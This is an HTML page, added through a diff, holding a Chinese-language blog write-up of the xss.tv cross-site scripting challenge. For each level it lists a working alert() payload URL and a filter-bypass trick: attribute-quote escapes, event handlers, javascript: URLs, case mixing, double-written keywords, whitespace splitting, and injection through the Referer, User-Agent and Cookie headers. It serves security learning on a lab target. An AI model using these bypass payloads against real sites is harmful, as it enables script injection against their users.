@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"findneo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="http:&#x2F;&#x2F;test.xss.tv http:&#x2F;&#x2F;47.94.13.75&#x2F;test&#x2F;  test on Firefox  54.0 (64-bit)  Level1123456view-source:http:&#x2F;&#x2F;47.94.13.75&#x2F;test&#x2F;level1.php?name&#x3D;test&lt;h2 align&#x3D;center&gt;欢迎用户test&lt;&#x2F;h2&gt;直接在文本中输出用户提交">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss.tv挑战赛">
+<meta property="og:url" content="https://findneo.github.io/180405XSSTVChallenge/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="http:&#x2F;&#x2F;test.xss.tv http:&#x2F;&#x2F;47.94.13.75&#x2F;test&#x2F;  test on Firefox  54.0 (64-bit)  Level1123456view-source:http:&#x2F;&#x2F;47.94.13.75&#x2F;test&#x2F;level1.php?name&#x3D;test&lt;h2 align&#x3D;center&gt;欢迎用户test&lt;&#x2F;h2&gt;直接在文本中输出用户提交">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-04-05T15:47:33.000Z">
+<meta property="article:modified_time" content="2021-03-09T13:32:32.000Z">
+<meta property="article:author" content="findneo">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://findneo.github.io/180405XSSTVChallenge/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>xss.tv挑战赛 | 闲言语</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">闲言语</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180405XSSTVChallenge/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/findneo.png">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xss.tv挑战赛
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-04-05 23:47:33" itemprop="dateCreated datePublished" datetime="2018-04-05T23:47:33+08:00">2018-04-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-09 21:32:32" itemprop="dateModified" datetime="2021-03-09T21:32:32+08:00">2021-03-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p><a target="_blank" rel="noopener" href="http://test.xss.tv/">http://test.xss.tv</a></p>
+<p><a target="_blank" rel="noopener" href="http://47.94.13.75/test/">http://47.94.13.75/test/</a></p>
+</blockquote>
+<p><code>test on Firefox  54.0 (64-bit)</code> </p>
+<h1 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level1.php?name=test</span></span><br><span class="line">&lt;h2 align=center&gt;欢迎用户test&lt;/h2&gt;</span><br><span class="line">直接在文本中输出用户提交的变量</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level1.php?name=&lt;script&gt;alert()&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">收获：为HTML body添加标签。</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level2.php?keyword=test</span></span><br><span class="line">&lt;input name=keyword  value=<span class="string">&quot;test&quot;</span>&gt;</span><br><span class="line">直接在标签属性中用户提交的变量</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level2.php?keyword=&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">收获：闭合标签属性的双引号、闭合标签并在标签外添加script标签。</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27;;!-&quot;&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27;;!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;</span><span class="string">&#x27;;!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">两处输出都对双引号、尖括号和&amp;进行了HTML实体编码，但前面的单引号可以被闭合，考虑使用input标签的某些事件执行脚本。</span><br><span class="line">自动聚焦到输入框，打开就弹</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27; onfocus=&#x27;alert()&#x27; autofocus=&#x27;</span></span><br><span class="line">点击页面非输入框的任何地方以移开焦点</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27;  autofocus onblur=&#x27;alert()</span></span><br><span class="line">点击输入框</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27; onfocus=&#x27;alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27;  onclick=&#x27;alert()</span></span><br><span class="line">在输入框输入</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27; oninput=&#x27;alert()</span></span><br><span class="line">输入然后点击搜索</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27; onchange=&#x27;alert()</span></span><br><span class="line">移动鼠标经过输入框</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27; onmousemove=&#x27;alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27; onmouseout=&#x27;alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27; onmouseover=&#x27;alert()</span></span><br><span class="line">点击输入框，进行按键操作</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27; onkeydown=&#x27;alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27; onkeyup=&#x27;alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27; onkeypress=&#x27;alert()</span></span><br><span class="line">双击输入框</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=&#x27;  ondblclick=&#x27;alert()</span></span><br><span class="line"></span><br><span class="line">更多可用事件可以参考这里：https:<span class="comment">//www.w3schools.com/tags/ref_eventattributes.asp</span></span><br><span class="line"></span><br><span class="line">收获：闭合标签属性的单引号并在标签中添加事件。</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level4.php?keyword=&#x27;;!-&quot;&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27;;!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>;!-<span class="string">&quot;findneo=&#123;()&#125;/\&amp;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，在标签属性值中过滤了尖括号。</span><br><span class="line">把上一题payload的单引号换成双引号应该都可以用</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level4.php?keyword=&quot; onfocus=&#x27;alert()&#x27; autofocus=&quot;</span></span><br><span class="line"></span><br><span class="line">收获：闭合标签属性的双引号并在标签中添加事件。</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level5.php?keyword=&#x27;;!-&quot;&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27;;!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>;!-<span class="string">&quot;&lt;findneo&gt;=&#123;()&#125;/\&amp;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，标签属性值没有编码</span><br><span class="line">进一步测试发现query会转成小写，&lt;script，on等敏感词会加下划线</span><br><span class="line">看起来事件和script标签都不好使，可以闭合原来的标签，自己添加标签，然后试着用用刚从书里学到的伪协议</span><br><span class="line">点击findneo就能弹</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level5.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;findneo&lt;/a&gt;</span></span><br><span class="line">做一下美化</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level5.php?keyword=&quot; type=&quot;hidden&quot;/&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;aa&lt;/a&gt;&lt;input type=&quot;hidden</span></span><br><span class="line">vbscript和dataURI似乎都不能奏效。</span><br><span class="line"></span><br><span class="line">收获：利用JavaScript伪协议。</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//47.94.13.75/test/level6.php?keyword=&#x27;;!-&quot;&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line"></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27;;!-findneo=&#123;()&#125;/\相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>;!-<span class="string">&quot;&lt;findneo&gt;=&#123;()&#125;/\&amp;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，标签值属性没有编码</span><br><span class="line"></span><br><span class="line">进一步测试发现&lt;script,on,href都被加下划线了，但是没有做全部转小写的操作，所以可以大小写绕过。</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level6.php?keyword=&quot;&gt;&lt;Script&gt;alert()&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">收获：大小写绕过敏感词检测。</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level7.php?keyword=&#x27;;!-&quot;&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27;;!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>;!-<span class="string">&quot;&lt;findneo&gt;=&#123;()&#125;/\&amp;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，标签值属性没有编码</span><br><span class="line">进一步测试发现on,script,href都被替换为空，但只执行一次，没有递归操作，可以用关键字嵌套来绕过。</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level7.php?keyword=&quot;&gt;&lt;soncript&gt;alert()&lt;/soncript&gt;</span></span><br><span class="line"></span><br><span class="line">收获：关键字嵌套（双写）绕过敏感词过滤。</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level8.php?keyword=&#x27;;!-&quot;&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&#x27;;!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;&quot;</span>&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;&#x27;;!-&amp;quot&lt;findneo&gt;=&#123;()&#125;/\&amp;&quot;</span>&gt;友情链接&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">input标签的value属性输出处编码了双引号、尖括号和&amp;；a标签的href属性输出处编码了双引号。</span><br><span class="line">进一步测试发现数据都被转小写，on,script,href,data等都被加下划线了。</span><br><span class="line">一番查找资料发现了可以通过JavaScript变换（利用空白符如水平制表符HT，换行符LF，回车键CR来截断关键字）的办法绕过</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level8.php?keyword=javas%09cript:alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level8.php?keyword=javas%0acript:alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level8.php?keyword=javas%0dcript:alert()</span></span><br><span class="line"></span><br><span class="line">可在http:<span class="comment">//wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html</span></span><br><span class="line">页面内搜索“JavaScript变换”看到相关信息。</span><br><span class="line"></span><br><span class="line">收获：空白符（特殊的结束标识符）绕过敏感词检测。</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level9.php?keyword=http://&#x27;;!-&quot;&lt;finDneo&gt;=&#123;()&#125;/\&amp;</span></span><br><span class="line">&lt;input name=keyword  value=<span class="string">&quot;http://&#x27;;!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;&quot;</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;http:/</span><span class="regexp">/&#x27;;!-&amp;quot&lt;findneo&gt;=&#123;()&#125;/</span>\&amp;<span class="string">&quot;&gt;友情链接&lt;/a&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输入数据全部转为小写，且必须协议正确，刚开始以为必须以“http://”开头，后来发现只要含有就可以了。</span></span><br><span class="line"><span class="string">input标签的值编码了双引号、尖括号和&amp;；href处编码了双括号。</span></span><br><span class="line"><span class="string">从上一题稍作变化即可</span></span><br><span class="line"><span class="string">http://47.94.13.75/test/level9.php?keyword=javas%09cript:alert(&#x27;http://&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">收获：如果要检测URL协议，应该检测协议名是否在字符串的开头。</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level10.php?keyword=&#x27;;!-&quot;&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">&#x27;;!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">只有一个输出点，编码了双引号、尖括号和&amp;。谷歌了很久，都说这几乎是不可能成的。（If angle brackets and double quote characters are escaped, this is enough to prevent XSS in HTML body and double quoted entity value contexts.）</span></span><br><span class="line"><span class="string">无奈之下查了writeup，发现自己观察能力需要提高，显著的hidden就在眼皮底下，竟然一点都没有注意到。</span></span><br><span class="line"><span class="string">有一个隐藏的表单如下：</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">可尝试其参数是否可能被注入</span></span><br><span class="line"><span class="string">访问47.94.13.75/test/level10.php?keyword=asdf&amp;t_link=&quot;&amp;t_history=&quot;&amp;t_sort=&quot;</span></span><br><span class="line"><span class="string">会发现在相应中t_sort是可注入双引号的，于是可以构造链接弹窗。</span></span><br><span class="line"><span class="string">http://47.94.13.75/test/level10.php?t_sort=&quot;  autofocus onfocus=alert() type=&quot;text</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">收获：注意测试隐藏元素。</span></span><br><span class="line"><span class="string">这道题乍一看有些让人摸不着头脑，但仔细想想觉得这在真实环境中是会发生的。开发者利用隐藏的表单提交数据，然后就默认这些数据是可靠的，于是在忘记或者认为没必要在服务端做校验，这就导致了代码的缺陷。像本题的t_sort键就是个例子，所以如果遇到hidden的元素可以测一测。</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">test1:view-source:http:<span class="comment">//47.94.13.75/test/level11.php?keyword=&amp;t_link=&quot;&lt;xss&gt;&amp;t_history=&quot;&lt;xss&gt;&amp;t_sort=&#x27;&lt;xss&gt;&amp;t_ref=&quot;&lt;xss&gt;</span></span><br><span class="line">与上一题类似，表单中多了一个t_ref，但看起来只有t_sort可以注入。</span><br><span class="line">test2:view-source:http:<span class="comment">//47.94.13.75/test/level11.php?t_sort=&#x27;;!-&quot;&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">得到：&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&#x27;;!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br><span class="line">对双引号、尖括号和&amp;进行了编码。input标签中value属性的双引号难以逃逸。</span><br><span class="line">考虑莫名多出来的t_ref,猜测服务端是取请求头的referer值来返回，于是截包添加请求头。</span><br><span class="line">referer: <span class="string">&quot; autofocus onfocus=alert() type=&quot;</span>text</span><br><span class="line"></span><br><span class="line">收获：寻找一些可能的、可控的输入！</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level12.php?keyword=findneo</span></span><br><span class="line">与上一题相似，这题修改的是UA。</span><br><span class="line"></span><br><span class="line">收获：User-Agent（以及HTTP请求头的其他部分）也是可控的输入。</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level13.php?keyword=findneo</span></span><br><span class="line">与前面类似，修改Cookie。</span><br><span class="line"></span><br><span class="line">收获：Cookie（以及HTTP请求头的其他部分）也是可控的输入。</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//47.94.13.75/test/level16.php</span></span><br><span class="line">测试发现编码了/和空格</span><br><span class="line">将后面内容注释掉，使用无需闭合的标签，使用特殊空白符代替空格即可</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level16.php?keyword=findneo&lt;img%0asrc=&#x27;&#x27;%0aonerror=alert(1)&gt;&lt;!--</span></span><br><span class="line"></span><br><span class="line">收获：注释符，空白符</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="findneo 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
